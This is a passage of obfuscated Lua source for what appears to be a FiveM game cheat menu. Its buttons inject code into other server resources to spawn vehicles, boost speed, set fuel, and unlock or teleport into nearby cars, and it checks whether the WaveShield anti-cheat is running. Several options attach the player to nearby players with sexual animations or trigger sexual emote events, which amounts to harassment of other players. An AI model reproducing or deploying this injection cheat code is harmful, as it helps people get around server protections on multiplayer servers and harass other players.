                local VcZoPwLsEkRn = math.floor
                local DfHkLtQwAzCx = math.sin
                local PlJoQwErTgYs = CreateThread
                local MzLxVoKsUyNz = GetVehiclePedIsIn
                local EyUiNkOpLtRg = PlayerPedId
                local KxFwEmTrZpYq = DoesEntityExist
                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

                local yGfTzLkRn = 1.0

                local function HrCvWbXuNz(freq)
                    local color = {}
                    local t = WvBnMpLsQzTx() / 1000
                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                    return color
                end

                PlJoQwErTgYs(function()
                    while GxRpVuNzYiTq and not Unloaded do
                        local ped = EyUiNkOpLtRg()
                        local veh = MzLxVoKsUyNz(ped, false)
                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                        end
                        Wait(0)
                    end
                end)
            end

            jqX7TvYzWq()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            GxRpVuNzYiTq = false
        ]]);end);MachoMenuCheckbox(v43[87 -(84 + 2) ],"Drift Mode (Hold Shift)",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
            MqTwErYuIoLp = true

            local function PlRtXqJm92()
                local XtFgDsQwAzLp = CreateThread
                local UiOpAsDfGhKl = PlayerPedId
                local JkHgFdSaPlMn = GetVehiclePedIsIn
                local WqErTyUiOpAs = IsControlPressed
                local AsZxCvBnMaSd = DoesEntityExist
                local KdJfGvBhNtMq = SetVehicleReduceGrip

                XtFgDsQwAzLp(function()
                    while MqTwErYuIoLp and not Unloaded do
                        Wait(0)
                        local ped = UiOpAsDfGhKl()
                        local veh = JkHgFdSaPlMn(ped, false)
                        if veh ~= 0 and AsZxCvBnMaSd(veh) then
                            if WqErTyUiOpAs(0, 21) then
                                KdJfGvBhNtMq(veh, true)
                            else
                                KdJfGvBhNtMq(veh, false)
                            end
                        end
                    end
                end)
            end

            PlRtXqJm92()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            MqTwErYuIoLp = false
            local ZtQwErTyUiOp = PlayerPedId
            local DfGhJkLzXcVb = GetVehiclePedIsIn
            local VbNmAsDfGhJk = DoesEntityExist
            local NlJkHgFdSaPl = SetVehicleReduceGrip

            local ped = ZtQwErTyUiOp()
            local veh = DfGhJkLzXcVb(ped, false)
            if veh ~= 0 and VbNmAsDfGhJk(veh) then
                NlJkHgFdSaPl(veh, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1 -0 ],"Easy Handling",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
            NvGhJkLpOiUy = true

            local function KbZwVoYtLx()
                local BtGhYtUlOpLk = CreateThread
                local WeRtYuIoPlMn = PlayerPedId
                local TyUiOpAsDfGh = GetVehiclePedIsIn
                local UyTrBnMvCxZl = SetVehicleGravityAmount
                local PlMnBvCxZaSd = SetVehicleStrong

                BtGhYtUlOpLk(function()
                    while NvGhJkLpOiUy and not Unloaded do
                        local ped = WeRtYuIoPlMn()
                        local veh = TyUiOpAsDfGh(ped, false)
                        if veh and veh ~= 0 then
                            UyTrBnMvCxZl(veh, 73.0)
                            PlMnBvCxZaSd(veh, true)
                        end
                        Wait(0)
                    end

                    local ped = WeRtYuIoPlMn()
                    local veh = TyUiOpAsDfGh(ped, false)
                    if veh and veh ~= 0 then
                        UyTrBnMvCxZl(veh, 9.8)
                        PlMnBvCxZaSd(veh, false)
                    end
                end)
            end

            KbZwVoYtLx()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NvGhJkLpOiUy = false
            local UyTrBnMvCxZl = SetVehicleGravityAmount
            local PlMnBvCxZaSd = SetVehicleStrong
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh and veh ~= 0 then
                UyTrBnMvCxZl(veh, 9.8)
                PlMnBvCxZaSd(veh, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Shift Boost",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
            QwErTyUiOpSh = true

            local function ZxCvBnMmLl()
                local aAaBbCcDdEe = CreateThread
                local fFfGgGgHhIi = Wait
                local jJkKlLmMnNo = PlayerPedId
                local pPqQrRsStTu = IsPedInAnyVehicle
                local vVwWxXyYzZa = GetVehiclePedIsIn
                local bBcCdDeEfFg = IsDisabledControlJustPressed
                local sSeEtTvVbBn = SetVehicleForwardSpeed

                aAaBbCcDdEe(function()
                    while QwErTyUiOpSh and not Unloaded do
                        local _ped = jJkKlLmMnNo()
                        if pPqQrRsStTu(_ped, false) then
                            local _veh = vVwWxXyYzZa(_ped, false)
                            if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                                sSeEtTvVbBn(_veh, 150.0)
                            end
                        end
                        fFfGgGgHhIi(0)
                    end
                end)
            end

            ZxCvBnMmLl()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            QwErTyUiOpSh = false
        ]]);end);MachoMenuCheckbox(v43[1],"Instant Breaks",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
            VkLpOiUyTrEq = true

            local function YgT7FrqXcN()
                local ZxSeRtYhUiOp = CreateThread
                local LkJhGfDsAzXv = PlayerPedId
                local PoLkJhBgVfCd = GetVehiclePedIsIn
                local ErTyUiOpAsDf = IsDisabledControlPressed
                local GtHyJuKoLpMi = IsPedInAnyVehicle
                local VbNmQwErTyUi = SetVehicleForwardSpeed

                ZxSeRtYhUiOp(function()
                    while VkLpOiUyTrEq and not Unloaded do
                        local ped = LkJhGfDsAzXv()
                        local veh = PoLkJhBgVfCd(ped, false)
                        if veh and veh ~= 0 then
                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                VbNmQwErTyUi(veh, 0.0)
                            end
                        end
                        Wait(0)
                    end
                end)
            end

            YgT7FrqXcN()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            VkLpOiUyTrEq = false
        ]]);end);MachoMenuCheckbox(v43[843 -(497 + 345) ],"Unlimited Fuel",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
            BlNkJmLzXcVb = true

            local function LqWyXpR3tV()
                local TmPlKoMiJnBg = CreateThread
                local ZxCvBnMaSdFg = PlayerPedId
                local YhUjIkOlPlMn = IsPedInAnyVehicle
                local VcXzQwErTyUi = GetVehiclePedIsIn
                local KpLoMkNjBhGt = DoesEntityExist
                local JkLzXcVbNmAs = SetVehicleFuelLevel

                TmPlKoMiJnBg(function()
                    while BlNkJmLzXcVb and not Unloaded do
                        local ped = ZxCvBnMaSdFg()
                        if YhUjIkOlPlMn(ped, false) then
                            local veh = VcXzQwErTyUi(ped, false)
                            if KpLoMkNjBhGt(veh) then
                                JkLzXcVbNmAs(veh, 100.0)
                            end
                        end
                        Wait(100)
                    end
                end)
            end

            LqWyXpR3tV()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            BlNkJmLzXcVb = false
        ]]);end);local v56=MachoMenuInputbox(v43[1 + 1 ],"License Plate:","...");MachoMenuButton(v43[2],"Set License Plate",function() local v205=0 + 0 ;local v206;while true do if ((1333 -(605 + 728))==v205) then v206=MachoMenuGetInputbox(v56);if ((type(v206)=="string") and (v206~="")) then local v362=0;local v363;while true do if (v362==(0 + 0)) then v363=string.format([[
                local function xKqLZVwPt9()
                    local XcVbNmAsDfGhJkL = PlayerPedId
                    local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                    local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                    local pEd = XcVbNmAsDfGhJkL()
                    local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                    if vEh and vEh ~= 0 then
                        PoIuYtReWqAzXsDc(vEh, "%s")
                    end

                end

                xKqLZVwPt9()
            ]],v206);MachoInjectResource((v48("monitor") and "monitor") or "any" ,v363);break;end end end break;end end end);local v57=MachoMenuInputbox(v43[3 -1 ],"Vehicle Model:","...");MachoMenuButton(v43[1 + 1 ],"Spawn Car",function() local v207=0 -0 ;local v208;local v209;local v210;local v211;while true do if (v207==1) then v210=GetResourceState("lb-phone")=="started" ;v211=nil;v207=2 + 0 ;end if (v207==(5 -3)) then if ( not v209 and v210) then local v364=0 + 0 ;while true do if (v364==0) then v211=([[ 
                if type(CreateFrameworkVehicle) == "function" then
                    local model = "%s"
                    local hash = GetHashKey(model)
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then
                        local coords = GetEntityCoords(ped)
                        if coords then
                            local vehicleData = {
                                vehicle = json.encode({ model = model })
                            }
                            CreateFrameworkVehicle(vehicleData, coords)
                        end
                    end
                end
            ]]):format(v208);MachoInjectResource("lb-phone",v211);break;end end else local v365=489 -(457 + 32) ;while true do if (0==v365) then v211=([[ 
                local function XzRtVbNmQwEr()
                    local tYaPlXcUvBn = PlayerPedId
                    local iKoMzNbHgTr = GetEntityCoords
                    local wErTyUiOpAs = GetEntityHeading
                    local hGtRfEdCvBg = RequestModel
                    local bNjMkLoIpUh = HasModelLoaded
                    local pLkJhGfDsAq = Wait
                    local sXcVbNmZlQw = GetVehiclePedIsIn
                    local yUiOpAsDfGh = DeleteVehicle
                    local aSxDcFgHvBn = _G.CreateVehicle
                    local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                    local zMxNaLoKvRe = SetEntityAsMissionEntity
                    local mVbGtRfEdCv = SetVehicleOutOfControl
                    local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                    local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                    local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                    local vBtNrEuPwOa = SetNetworkIdCanMigrate
                    local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                    local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                    local bPeDrTfGyHu = tYaPlXcUvBn()
                    local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                    local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                    local nMiLoPzXwEq = "%s"

                    hGtRfEdCvBg(nMiLoPzXwEq)
                    while not bNjMkLoIpUh(nMiLoPzXwEq) do
                        pLkJhGfDsAq(100)
                    end

                    local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                    if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                        yUiOpAsDfGh(fVbGtFrEdSw)
                    end

                    local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                    local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                    zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                    mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                    eDsFgHjKlQw(xFrEdCvBgTn, false)
                    lAzSdXfCvBg(sMnLoKiJpUb, true)
                    nMqWlAzXcVb(xFrEdCvBgTn, false)
                    vBtNrEuPwOa(sMnLoKiJpUb, true)
                    gHrTyUjLoPk(nMiLoPzXwEq)

                    kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
                end

                XzRtVbNmQwEr()
            ]]):format(v208);MachoInjectResource((v48("monitor") and "monitor") or "any" ,v211);break;end end end break;end if ((0 + 0)==v207) then v208=MachoMenuGetInputbox(v57);v209=GetResourceState("WaveShield")=="started" ;v207=1403 -(832 + 570) ;end end end);MachoMenuButton(v43[3 + 0 ],"Repair Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function FgN7LqxZyP()
                local aBcD = PlayerPedId
                local eFgH = GetVehiclePedIsIn
                local iJkL = SetVehicleFixed
                local mNoP = SetVehicleDeformationFixed

                local p = aBcD()
                local v = eFgH(p, false)
                if v and v ~= 0 then
                    iJkL(v)
                    mNoP(v)
                end
            end

            FgN7LqxZyP()
        ]]);end);MachoMenuButton(v43[1 + 2 ],"Flip Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function vXmYLT9pq2()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetEntityHeading
                local d = SetEntityRotation

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    d(veh, 0.0, 0.0, c(veh))
                end
            end

            vXmYLT9pq2()
        ]]);end);MachoMenuButton(v43[10 -7 ],"Clean Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qPwRYKz7mL()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = SetVehicleDirtLevel

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    c(veh, 0.0)
                end
            end

            qPwRYKz7mL()
        ]]);end);MachoMenuButton(v43[2 + 1 ],"Delete Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function LXpTqWvR80()
                local aQw = PlayerPedId
                local bEr = GetVehiclePedIsIn
                local cTy = DoesEntityExist
                local dUi = NetworkHasControlOfEntity
                local eOp = SetEntityAsMissionEntity
                local fAs = DeleteEntity
                local gDf = DeleteVehicle
                local hJk = SetVehicleHasBeenOwnedByPlayer

                local ped = aQw()
                local veh = bEr(ped, false)

                if veh and veh ~= 0 and cTy(veh) then
                    hJk(veh, true)
                    eOp(veh, true, true)

                    if dUi(veh) then
                        fAs(veh)
                        gDf(veh)
                    end
                end

            end

            LXpTqWvR80()
        ]]);end);MachoMenuButton(v43[799 -(588 + 208) ],"Toggle Vehicle Engine",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function NKzqVoXYLm()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetIsVehicleEngineRunning
                local d = SetVehicleEngineOn

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    if c(veh) then
                        d(veh, false, true, true)
                    else
                        d(veh, true, true, false)
                    end
                end
            end

            NKzqVoXYLm()
        ]]);end);MachoMenuButton(v43[8 -5 ],"Max Vehicle Upgrades",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function XzPmLqRnWyBtVkGhQe()
                local FnUhIpOyLkTrEzSd = PlayerPedId
                local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                local RfDsHuNjMaLpOyBt = SetVehicleModKit
                local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                local QwErTyUiOpAsDfGh = SetVehicleMod
                local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                local UjMiKoLpNwAzSdFg = SetVehicleExtra
                local RvTgYhNuMjIkLoPb = DoesExtraExist

                local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                for XyZoPqRtWnEsDfGh = 0, 16 do
                    local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                    if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                    end
                end

                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                end

                for QeTrBnMkOjHuYgFv = 17, 22 do
                    ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                end

                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                for TpYuIoPlMnBvCxZq = 1, 12 do
                    if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                        UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                    end
                end

                MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
            end

            XzPmLqRnWyBtVkGhQe()
        ]]);end);MachoMenuButton(v43[1803 -(884 + 916) ],"Teleport into Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function uPKcoBaEHmnK()
                local ziCFzHyzxaLX = SetPedIntoVehicle
                local YPPvDlOGBghA = GetClosestVehicle

                local Coords = GetEntityCoords(PlayerPedId())
                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                    else
                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                    end
                end
            end

            uPKcoBaEHmnK()
        ]]);end);MachoMenuButton(v43[6 -3 ],"Unlock Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function TpLMqKtXwZ()
                local AsoYuTrBnMvCxZaQw = PlayerPedId
                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                local ped = AsoYuTrBnMvCxZaQw()
                local coords = GhrTnLpKjUyVbMnZx(ped)
                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                    VczNmLoJhBgVfCdEx(veh, true, true)
                    RtYuIoPlMnBvCxZaSd(veh, true)
                    EqWoXyBkVsNzQuH(veh, 1)
                    YxZwQvTrBnMaSdFgHj(veh, false)
                end

            end

            TpLMqKtXwZ()
        ]]);end);MachoMenuButton(v43[3],"Lock Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function tRYpZvKLxQ()
                local WqEoXyBkVsNzQuH = PlayerPedId
                local LoKjBtWxFhPoZuR = GetEntityCoords
                local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                local ped = WqEoXyBkVsNzQuH()
                local coords = LoKjBtWxFhPoZuR(ped)
                local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                    PlMnBvCxZaSdFgTrEq(veh, true, true)
                    KjBtWxFhPoZuRZlK(veh, true)
                    AsDfGhJkLzXcVbNmQwE(veh, 2)
                    QwEoXyBkVsNzQuHL(veh, true)
                end
            end

            tRYpZvKLxQ()
        ]]);end);MachoMenuButton(v44[1],"Force Emotes [Be careful]",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            Citizen.CreateThread(function()
        local playerPed = PlayerPedId()
        local playerId = GetPlayerServerId(PlayerId())

        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    end)
        ]]);end);MachoMenuButton(v44[1],"Detach All Entitys",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zXqLJWt7pN()
                local xPvA71LtqzW = ClearPedTasks
                local bXcT2mpqR9f = DetachEntity

                xPvA71LtqzW(PlayerPedId())
                bXcT2mpqR9f(PlayerPedId())
            end

            zXqLJWt7pN()
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Twerk On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function OyWTpKvmXq()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                
                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)
                        
                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkDaddy then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkDaddy = false
                    else
                        StarkDaddy = true
                        if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                            RequestAnimDict("switch@trevor@mocks_lapdance")
                            while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                Wait(0)
                            end        
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            OyWTpKvmXq()
        ]]);end);MachoMenuButton(v44[1],"Give Them Backshots",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function bXzLqPTMn9()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkDaddy then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkDaddy = false
                    else
                        StarkDaddy = true
                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                            RequestAnimDict("rcmpaparazzo_2")
                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    end
                end
            end

            bXzLqPTMn9()
        ]]);end);MachoMenuButton(v44[654 -(232 + 421) ],"Wank On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qXW7YpLtKv()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if isInPiggyBack then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        wankoffperson = false
                    else
                        wankoffperson = true
                        if not HasAnimDictLoaded("mp_player_int_upperwank") then
                            RequestAnimDict("mp_player_int_upperwank")
                            while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                Wait(0)
                            end
                        end
                    end

                    TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
                end
            end

            qXW7YpLtKv()
        ]]);end);MachoMenuButton(v44[1890 -(1569 + 320) ],"Piggyback On Player",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function RtKpqLmXZV()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if isInPiggyBack then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        isInPiggyBack = false
                    else
                        isInPiggyBack = true
                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
